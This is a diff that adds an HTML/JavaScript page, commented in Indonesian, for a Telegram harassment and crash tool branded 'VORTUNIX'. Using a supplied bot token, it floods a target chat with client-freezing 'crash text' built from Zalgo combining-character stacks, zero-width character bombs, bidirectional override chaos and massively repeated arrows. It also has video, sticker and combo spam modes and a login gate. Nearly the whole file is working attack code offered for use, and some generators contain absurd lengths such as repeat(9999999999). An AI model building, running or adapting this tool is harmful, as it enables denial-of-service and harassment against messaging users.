+    emoji: ["🔥", "💥", "🌟", "⭐", "✨", "💫", "💀", "👻", "🤖", "👾", "😈", "👹", "👺", "💩", "🤡", "👽", "👁", "🗯", "🚀", "🌪", "🌀", "⚡", "💣", "🧨", "🎯", "🎮", "🎲"]
+};
+
+// Fungsi utama crash text extreme
+async function crashTextExtreme(chatId, count = 8, delayMs = 1500) {
+    console.log(`💀 Starting VORTUNIX TEXT EXTREME Attack to ${chatId}`);
+    
+    for (let i = 0; i < count; i++) {
+        try {
+            const extremeText = generateExtremeText(i);
+            const textToSend = extremeText.substring(0, 4096);
+            
+            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: textToSend,
+                    parse_mode: 'HTML'
+                })
+            });
+            
+            const data = await response.json();
+            
+            if (data.ok) {
+                console.log(`💥 Text Extreme ${i+1}/${count} - ${textToSend.length} chars sent`);
+                logMessage(`💥 Text Extreme ${i+1}/${count} - ${textToSend.length} chars`, 'success');
+                updateStats('success');
+            } else {
+                console.log(`❌ Text Error: ${data.description}`);
+                logMessage(`❌ Text Extreme ${i+1}/${count} gagal: ${data.description}`, 'error');
+                updateStats('error');
+            }
+            
+            updateStats('sent');
+            await delay(delayMs);
+            
+        } catch (error) {
+            console.log(`💥 Text Extreme Error: ${error.message}`);
+            logMessage(`💥 Text Extreme ${i+1}/${count} error: ${error.message}`, 'error');
+            updateStats('error');
+        }
+    }
+    
+    console.log(`🎉 VORTUNIX TEXT EXTREME Attack completed!`);
+    logMessage(`🎉 TEXT EXTREME Attack selesai!`, 'success');
+}
+
+// Fungsi untuk generate text extreme dengan berbagai teknik
+function generateExtremeText(iteration) {
+    const techniques = [
+        // Technique 1: Zalgo Extreme dengan stacking
+        () => {
+            let text = "V҉O҉R҉T҉U҉N҉I҉X ".repeat(9999999999);
+            for (let i = 0; i < text.length; i += 2) {
+                for (let j = 0; j < 15; j++) {
+                    const combiner = extremeChars.combining[Math.floor(Math.random() * extremeChars.combining.length)];
+                    text = text.slice(0, i) + combiner + text.slice(i);
+                }
+            }
+            return text;
+        },
+
+        // Technique 2: Invisible Bomb dengan zero-width
+        () => {
+            let text = "";
+            for (let i = 0; i < 20; i++) {
+                text += "VORTUNIX";
+                for (let j = 0; j < 50; j++) {
+                    text += extremeChars.zeroWidth[Math.floor(Math.random() * extremeChars.zeroWidth.length)];
+                }
+            }
+            return text;
+        },
+
+        // Technique 3: Directional Chaos (RTL + LTR mix)
+        () => {
+            return "\u202E" + "VORTUNIX CRASH TEXT " + 
+                   "\u202D" + "ATTACK EXTREME MODE " +
+                   "\u202E" + "SYSTEM OVERLOAD " +
+                   "\u202C" + "MEMORY LEAK DETECTED " +
+                   "\u202B" + "CLIENT FREEZE IMMINENT " +
+                   "\u202C" + "END OF TRANSMISSION";
+        },
+
+        // Technique 4: Mathematical Formula Bomb
+        () => {
+            let text = "MATHEMATICAL OVERLOAD:\n";
+            for (let i = 0; i < 50; i++) {
+                text += `∑(n=${i}→∞) f(n) = ${Math.random()}\n`;
+                text += `∫${i}^{${i+1}} x dx = ${Math.random()}\n`;
+                text += `∇⋅F = ${Math.random()}\n`;
+                text += `∂²u/∂t² = c²∇²u + ${Math.random()}\n`;
+            }
+            return text;
+        },
+
+        // Technique 5: Geometric Pattern Extreme
+        () => {
+            let text = "GEOMETRIC PATTERN:\n";
+            const patterns = [
+                "█▀▀▀▀▀▀▀▀▀█",
+                "▌MMMMMMMMM▐", 
+                "▌SSSSSSSSS▐",
+                "▌TTTTTTTTT▐",
+                "▌AAAAAAAAA▐",
+                "▌ZZZZZZZZZ▐",
+                "▌IIIIIIIII▐",
+                "▌YYYYYYYYY▐",
+                "█▄▄▄▄▄▄▄▄▄█"
+            ];
+            
+            for (let i = 0; i < 20; i++) {
+                patterns.forEach(pattern => {
+                    text += pattern + "\n";
+                });
+            }
+            return text;
+        }
+    ];
+
+    const techniqueIndex = iteration % techniques.length;
+    return techniques[techniqueIndex]();
+}
+
+// Fungsi crash text ultra mega extreme
+async function crashTextUltraMega(chatId, count = 5, delayMs = 3000) {
+    console.log(`☢️ Starting VORTUNIX ULTRA MEGA TEXT Attack to ${chatId}`);
+    
+    for (let i = 0; i < count; i++) {
+        try {
+            const ultraText = generateUltraMegaText();
+            const textToSend = ultraText.substring(0, 4096);
+            
+            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: textToSend,
+                    parse_mode: 'HTML'
+                })
+            });
+            
+            const data = await response.json();
+            
+            if (data.ok) {
+                console.log(`☢️ ULTRA MEGA Text ${i+1}/${count} - ${textToSend.length} chars`);
+                logMessage(`☢️ ULTRA MEGA Text ${i+1}/${count} - ${textToSend.length} chars`, 'success');
+                updateStats('success');
+            } else {
+                console.log(`❌ ULTRA MEGA Error: ${data.description}`);
+                logMessage(`❌ ULTRA MEGA ${i+1}/${count} gagal: ${data.description}`, 'error');
+                updateStats('error');
+            }
+            
+            updateStats('sent');
+            await delay(delayMs);
+            
+        } catch (error) {
+            console.log(`💀 ULTRA MEGA Error: ${error.message}`);
+            logMessage(`💀 ULTRA MEGA ${i+1}/${count} error: ${error.message}`, 'error');
+            updateStats('error');
+        }
+    }
+    
+    console.log(`🎉 VORTUNIX ULTRA MEGA TEXT Attack completed!`);
+    logMessage(`🎉 ULTRA MEGA TEXT Attack selesai!`, 'success');
+}
+
+function generateUltraMegaText() {
+    let text = "☢️ VORTUNIX ULTRA MEGA TEXT ATTACK ☢️\n\n";
+    
+    // Section 1: Super Zalgo Stack
+    text += "SECTION 1 - SUPER ZALGO:\n";
+    let zalgoBase = "VORTUNIX";
+    for (let char of zalgoBase) {
+        text += char;
+        for (let i = 0; i < 30; i++) {
+            text += extremeChars.combining[Math.floor(Math.random() * extremeChars.combining.length)];
+        }
+    }
+    text += "\n\n";
+    
+    // Section 2: Invisible Character Bomb
+    text += "SECTION 2 - INVISIBLE BOMB:\n";
+    for (let i = 0; i < 1000; i++) {
+        text += extremeChars.zeroWidth[Math.floor(Math.random() * extremeChars.zeroWidth.length)];
+    }
+    text += "VISIBLE_TEXT";
+    for (let i = 0; i < 1000; i++) {
+        text += extremeChars.zeroWidth[Math.floor(Math.random() * extremeChars.zeroWidth.length)];
+    }
+    text += "\n\n";
+    
+    // Section 3: Directional Chaos Extreme
+    text += "SECTION 3 - DIRECTIONAL CHAOS:\n";
+    text += "\u202E" + "RIGHT TO LEFT TEXT " + "\u202D" + "LEFT TO RIGHT TEXT " + 
+           "\u202E" + "MIXED DIRECTION " + "\u202C" + "NORMAL TEXT " +
+           "\u202B" + "EMBEDDED RTL " + "\u202C" + "POPPED TEXT";
+    text += "\n\n";
+    
+    // Section 4: Mathematical Overload
+    text += "SECTION 4 - MATHEMATICAL OVERLOAD:\n";
+    for (let i = 0; i < 50; i++) {
+        text += extremeChars.math.join("") + " ";
+    }
+    text += "\n\n";
+    
+    return text;
+}
+
+// Fungsi crash text dengan efek tembus 4 arah
+async function crashTextTembus4Arah(chatId, count = 6, delayMs = 2500) {
+    console.log(`🎯 Starting VORTUNIX TEXT TEMBUS 4 ARAH Attack to ${chatId}`);
+    
+    for (let i = 0; i < count; i++) {
+        try {
+            const tembusText = generateTembus4ArahText();
+            const textToSend = tembusText.substring(0, 4096);
+            
+            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: textToSend
+                })
+            });
+            
+            const data = await response.json();
+            
+            if (data.ok) {
+                console.log(`🎯 Tembus 4 Arah ${i+1}/${count} - ${textToSend.length} chars`);
+                logMessage(`🎯 Tembus 4 Arah ${i+1}/${count} - ${textToSend.length} chars`, 'success');
+                updateStats('success');
+            } else {
+                console.log(`❌ Tembus Error: ${data.description}`);
+                logMessage(`❌ Tembus 4 Arah ${i+1}/${count} gagal: ${data.description}`, 'error');
+                updateStats('error');
+            }
+            
+            updateStats('sent');
+            await delay(delayMs);
+            
+        } catch (error) {
+            console.log(`💥 Tembus Error: ${error.message}`);
+            logMessage(`💥 Tembus 4 Arah ${i+1}/${count} error: ${error.message}`, 'error');
+            updateStats('error');
+        }
+    }
+    
+    console.log(`🎉 VORTUNIX TEXT TEMBUS 4 ARAH Attack completed!`);
+    logMessage(`🎉 TEXT TEMBUS 4 ARAH Attack selesai!`, 'success');
+}
+
+function generateTembus4ArahText() {
+    let text = "";
+    
+    // ATAS: Text dengan banyak newlines dan karakter atas
+    text += "⬆️ ARAH ATAS ⬆️\n";
+    for (let i = 0; i < 20; i++) {
+        text += "↑".repeat(99999) + "\n";
+    }
+    
+    // KANAN: Text dengan padding kanan extreme
+    text += "\n➡️ ARAH KANAN ➡️\n";
+    for (let i = 0; i < 10; i++) {
+        text += "VORTUNIX".padEnd(100, "→") + "\n";
+    }
+    
+    // KIRI: Text dengan RTL dan karakter kiri
+    text += "\n⬅️ ARAH KIRI ⬅️\n";
+    text += "\u202E";
+    for (let i = 0; i < 10; i++) {
+        text += "VORTUNIX".padStart(50, "←") + "\n";
+    }
+    text += "\u202C";
+    
+    // BAWAH: Text dengan karakter bawah
+    text += "\n⬇️ ARAH BAWAH ⬇️\n";
+    for (let i = 0; i < 20; i++) {
+        text += "↓".repeat(9999999) + "\n";
+    }
+    
+    // DIAGONAL: Text dengan karakter diagonal
+    text += "\n↗️ ARAH DIAGONAL ↙️\n";
+    const diagonals = ["↗", "↘", "↖", "↙"];
+    for (let i = 0; i < 15; i++) {
+        text += diagonals.map(dir => dir.repeat(999)).join("") + "\n";
+    }
+    
+    return text;
+}
+
+// Fungsi crash video
+async function crashVideo(chatId, count = 10, delayMs = 1000) {
+    console.log(`🎥 Starting VORTUNIX Video Crash Attack to ${chatId}`);
+    
+    for (let i = 0; i < count; i++) {
+        try {
+            const videoKeys = Object.keys(crashVideos);
+            const selectedVideoKey = videoKeys[Math.floor(Math.random() * videoKeys.length)];
+            const videoUrl = crashVideos[selectedVideoKey];
+            
+            const selectedCaption = crashCaptions[Math.floor(Math.random() * crashCaptions.length)];
+            const captionToSend = selectedCaption.substring(0, 1024);
+            
+            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    video: videoUrl,
+                    caption: captionToSend,
+                    parse_mode: 'HTML'
+                })
+            });
+            
+            const data = await response.json();
+            
+            if (data.ok) {
+                console.log(`✅ Video Crash ${i+1}/${count} sent successfully`);
+                logMessage(`✅ Video ${i+1}/${count} terkirim`, 'success');
+                updateStats('success');
+            } else {
+                console.log(`❌ Video Error: ${data.description}`);
+                logMessage(`❌ Video ${i+1}/${count} gagal: ${data.description}`, 'error');
+                updateStats('error');
+            }
+            
+            updateStats('sent');
+            await delay(delayMs);
+            
+        } catch (error) {
+            console.log(`💥 Video Error: ${error.message}`);
+            logMessage(`💥 Video ${i+1}/${count} error: ${error.message}`, 'error');
+            updateStats('error');
+        }
+    }
+    
+    console.log(`🎉 VORTUNIX Video Crash Attack completed!`);
+    logMessage(`🎉 Video Crash Attack selesai!`, 'success');
+}
+
+// Fungsi crash sticker
+async function spamSticker(chatId, count = 15, delayMs = 500) {
+    console.log(`🃏 Starting VORTUNIX Sticker Crash Attack to ${chatId}`);
+    
+    for (let i = 0; i < count; i++) {
+        try {
+            const selectedSticker = crashStickers[Math.floor(Math.random() * crashStickers.length)];
+            
+            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendSticker`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    sticker: selectedSticker
+                })
+            });
+            
+            const data = await response.json();
+            
+            if (data.ok) {
+                console.log(`✅ Sticker Crash ${i+1}/${count} sent successfully`);
+                logMessage(`✅ Sticker ${i+1}/${count} terkirim`, 'success');
+                updateStats('success');
+            } else {
+                console.log(`❌ Sticker Error: ${data.description}`);
+                logMessage(`❌ Sticker ${i+1}/${count} gagal: ${data.description}`, 'error');
+                updateStats('error');
+            }
+            
+            updateStats('sent');
+            await delay(delayMs);
+            
+        } catch (error) {
+            console.log(`💥 Sticker Error: ${error.message}`);
+            logMessage(`💥 Sticker ${i+1}/${count} error: ${error.message}`, 'error');
+            updateStats('error');
+        }
+    }
+    
+    console.log(`🎉 VORTUNIX Sticker Crash Attack completed!`);
+    logMessage(`🎉 Sticker Crash Attack selesai!`, 'success');
+}
+
+// Fungsi combo attack
+async function spamCombotloh(chatId, count = 8, delayMs = 1500) {
+    console.log(`⚡ Starting VORTUNIX COMBO Attack to ${chatId}`);
+    
+    for (let i = 0; i < count; i++) {
+        try {
+            await crashVideo(chatId, 1, 0);
+            await spamSticker(chatId, 1, 0);
+            await crashTextExtreme(chatId, 1, 0);
+            await crashTextUltraMega(chatId, 1, 0);
+            await crashTextTembus4Arah(chatId, 1, 0);
+            
+            updateStats('sent');
+            await delay(delayMs);
+            
+        } catch (error) {
+            console.log(`💥 COMBO Error: ${error.message}`);
+            logMessage(`💥 COMBO ${i+1}/${count} error: ${error.message}`, 'error');
+            updateStats('error');
+        }
+    }
+    
+    console.log(`🎉 VORTUNIX COMBO Attack completed!`);
+    logMessage(`🎉 COMBO Attack selesai!`, 'success');
+}
+
+// Fungsi untuk mengirim crash text biasa
+function generateCrashText() {
+    const crashChars = {
+        zalgo: ["҉", "⃝", "⃞"],
+        combining: ["\u0300", "\u0301", "\u0302", "\u0303"],
+        invisible: ["\u200B", "\u200C", "\u200D"]
+    };
+
+    const templates = [
+        () => {
+            let text = "M҉E҉T҉A҉Z҉I҉Y҉ ".repeat(9999);
+            for (let i = 0; i < text.length; i++) {
+                if (Math.random() > 0.7) {
+                    const combiner = crashChars.combining[Math.floor(Math.random() * crashChars.combining.length)];
+                    text = text.slice(0, i) + combiner + text.slice(i);
+                    i += combiner.length;
+                }
+            }
+            return text;
+        },
+        () => {
+            let text = "";
+            const base = "VORTUNIX";
+            for (let i = 0; i < 100; i++) {
+                text += base;
+                for (let j = 0; j < 5; j++) {
+                    text += crashChars.invisible[Math.floor(Math.random() * crashChars.invisible.length)];
+                }
+            }
+            return text;
+        }
+    ];
+
+    const selectedTemplate = templates[Math.floor(Math.random() * templates.length)];
+    return selectedTemplate();
+}
+
+async function spamTextloh(chatId, count = 10, delayMs = 1000) {
+    console.log(`🚀 Starting VORTUNIX Text Attack to ${chatId}`);
+    
+    for (let i = 0; i < count; i++) {
+        try {
+            const crashText = generateCrashText();
+            const textToSend = crashText.substring(0, 4096);
+            
+            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: textToSend,
+                    parse_mode: 'HTML'
+                })
+            });
+            
+            const data = await response.json();
+            
+            if (data.ok) {
+                console.log(`✅ Text ${i+1}/${count} sent successfully`);
+                logMessage(`✅ Text ${i+1}/${count} terkirim`, 'success');
+                updateStats('success');
+            } else {
+                console.log(`❌ Text Error: ${data.description}`);
+                logMessage(`❌ Text ${i+1}/${count} gagal: ${data.description}`, 'error');
+                updateStats('error');
+            }
+            
+            updateStats('sent');
+            await delay(delayMs);
+            
+        } catch (error) {
+            console.log(`💥 Text Error: ${error.message}`);
+            logMessage(`💥 Text ${i+1}/${count} error: ${error.message}`, 'error');
+            updateStats('error');
+        }
+    }
+    
+    console.log(`🎉 VORTUNIX Text Attack completed!`);
+    logMessage(`🎉 Text Attack selesai!`, 'success');
+}
+
+// ===============================
+// FUNGSI CONTROLLER
+// ===============================
+
+async function startSpam() {
+    if (!authSystem.checkAuth()) return;
+    
+    if (isRunning) {
+        alert("Attack sudah berjalan!");
+        return;
+    }
+    
+    botToken = document.getElementById('tokenInput').value.trim();
+    const chatId = document.getElementById('chatId').value.trim();
+    const count = parseInt(document.getElementById('count').value);
+    const delayMs = parseInt(document.getElementById('delay').value);
+    const mode = document.getElementById('mode').value;
+
+    if (!botToken || !chatId) {
+        alert("Isi Token & Target!");
+        return;
+    }
+
+    if (!validateTarget(chatId)) {
+        return;
+    }
+
+    stats = { sent: 0, success: 0, error: 0 };
+    updateStats();
+
+    isRunning = true;
+    document.getElementById('log').innerHTML = "";
+    logMessage(`🚀 Memulai ${mode} attack ke ${chatId}...`, "info");
+
+    try {
+        switch (mode) {
+            case "video": 
+                await crashVideo(chatId, count, delayMs); 
+                break;
+            case "sticker": 
+                await spamSticker(chatId, count, delayMs); 
+                break;
+            case "text": 
+                await spamTextloh(chatId, count, delayMs); 
+                break;
+            case "combo": 
+                await spamCombotloh(chatId, count, delayMs); 
+                break;
+            default: 
+                logMessage("❌ Mode tidak valid", "error");
+        }
+    } catch (error) {
+        logMessage(`❌ Error: ${error.message}`, "error");
+    } finally {
+        isRunning = false;
+        document.getElementById('attackBtn').innerHTML = '<i class="fas fa-fire"></i> Mulai Cosmic Attack';
+        logMessage("🏁 Attack selesai!", "success");
+    }
+}
+
+function stopSpam() {
+  isRunning = false;
+  logMessage("⏹️ Attack dihentikan", "warning");
+}
+
+function toggleAttack() {
+  const btn = document.getElementById('attackBtn');
+  
+  if (isRunning) {
+    stopSpam();
+    btn.innerHTML = '<i class="fas fa-fire"></i> Mulai Cosmic Attack';
+  } else {
+    btn.innerHTML = '<i class="fas fa-stop"></i> Stop Attack';
+    startSpam();
+  }
+}
+
+function setQuickSettings(count, delay) {
+  document.getElementById('count').value = count;
+  document.getElementById('countRange').value = count;
+  document.getElementById('delay').value = delay;
+  document.getElementById('delayRange').value = delay;
+  logMessage(`⚡ Quick settings: ${count} pesan, ${delay}ms delay`, "info");
+}
+
+function clearLog() {
+  document.getElementById('log').innerHTML = '';
+  logMessage('🗑️ Log cleared', "info");
+}
+
+// ===============================
+// FUNGSI LOGIN GLOBAL
+// ===============================
+
+async function checkLogin() {
+  const username = document.getElementById('loginUsername').value.trim();
+  const password = document.getElementById('loginPassword').value.trim();
+  const success = await authSystem.login(username, password);
+  
+  if (success) {
+    document.getElementById('loginUsername').value = '';
+    document.getElementById('loginPassword').value = '';
+  }
+}
+
+function logout() {
+  authSystem.logout();
+}
+
+// ===============================
+// INITIALIZATION
+// ===============================
+
+// Initialize particles.js
+particlesJS('particles-js', {
+  particles: {
+    number: {
+      value: 80,
+      density: {
+        enable: true,
+        value_area: 800
+      }
+    },
+    color: {
+      value: ['#ff00ff', '#9d00ff', '#00ff88']
+    },
+    shape: {
+      type: 'circle',
+      stroke: {
+        width: 0,
+        color: '#000000'
+      }
+    },
+    opacity: {
+      value: 0.5,
+      random: true,
+      anim: {
+        enable: true,
+        speed: 1,
+        opacity_min: 0.1,
+        sync: false
+      }
+    },
+    size: {
+      value: 3,
+      random: true,
+      anim: {
+        enable: true,
+        speed: 2,
+        size_min: 0.1,
+        sync: false
+      }
+    },
+    line_linked: {
+      enable: true,
+      distance: 150,
+      color: '#9d00ff',
+      opacity: 0.4,
+      width: 1
+    },
+    move: {
+      enable: true,
+      speed: 2,
+      direction: 'none',
+      random: true,
+      straight: false,
+      out_mode: 'bounce',
+      bounce: false,
+      attract: {
+        enable: true,
+        rotateX: 600,
+        rotateY: 1200
+      }
+    }
+  },
+  interactivity: {
+    detect_on: 'canvas',
+    events: {
+      onhover: {
+        enable: true,
+        mode: 'grab'
+      },
+      onclick: {
+        enable: true,
+        mode: 'push'
+      },
+      resize: true
+    },
+    modes: {
+      grab: {
+        distance: 140,
+        line_linked: {
+          opacity: 1
+        }
+      },
+      push: {
+        particles_nb: 4
+      }
+    }
+  },
+  retina_detect: true
+});
+
+// Add floating particles manually
+function createFloatingParticles() {
+  const container = document.querySelector('.container');
+  for (let i = 0; i < 10; i++) {
+    const particle = document.createElement('div');
+    particle.className = 'floating-particle';
+    particle.style.left = Math.random() * 100 + '%';
+    particle.style.top = Math.random() * 100 + '%';
+    particle.style.animationDelay = Math.random() * 5 + 's';
+    particle.style.background = i % 3 === 0 ? '#ff00ff' : i % 3 === 1 ? '#9d00ff' : '#00ff88';
+    container.appendChild(particle);
+  }
+}
+
+// Initialize ketika page load
+document.addEventListener('DOMContentLoaded', function() {
+  authSystem.initialize();
+  
+  // Update mode description when selection changes
+  document.getElementById('mode').addEventListener('change', function() {
+    const mode = this.value;
+    document.getElementById('modeDesc').textContent = modeDescriptions[mode] || "";
+  });
+  
+  // Add some sample log entries
+  setTimeout(() => {
+    const log = document.getElementById('log');
+    const sampleLogs = [
+      { msg: '🚀 Cosmic Attack System Ready', type: 'success' },
+      { msg: '⚡ Particles Network Activated', type: 'info' },
+      { msg: '🎯 Target Acquisition System Online', type: 'info' },
+      { msg: '💫 Gradient Shift Engine Started', type: 'success' },
+      { msg: '👻 Invisible Delay Mode Available', type: 'info' }
+    ];
+    
+    sampleLogs.forEach(logEntry => {
+      const entry = document.createElement('div');
+      entry.className = `log-entry ${logEntry.type}`;
+      entry.textContent = `[${new Date().toLocaleTimeString()}] ${logEntry.msg}`;
+      log.appendChild(entry);
+    });
+  }, 1000);
+  
+  createFloatingParticles();
+  
+  // Tambahkan event listener untuk Enter key
+  document.getElementById('loginUsername').addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') {
+      document.getElementById('loginPassword').focus();
+    }
+  });
+
+  document.getElementById('loginPassword').addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') {
+      checkLogin();
+    }
+  });
+
+  // Sync range inputs with number inputs
+  document.getElementById('countRange').addEventListener('input', function() {
+    document.getElementById('count').value = this.value;
+  });
+
+  document.getElementById('count').addEventListener('input', function() {
+    document.getElementById('countRange').value = this.value;
+  });
+
+  document.getElementById('delayRange').addEventListener('input', function() {
+    document.getElementById('delay').value = this.value;
+  });
+
+  document.getElementById('delay').addEventListener('input', function() {
+    document.getElementById('delayRange').value = this.value;
+  });
+});
+</script>
+</body>
+</html>
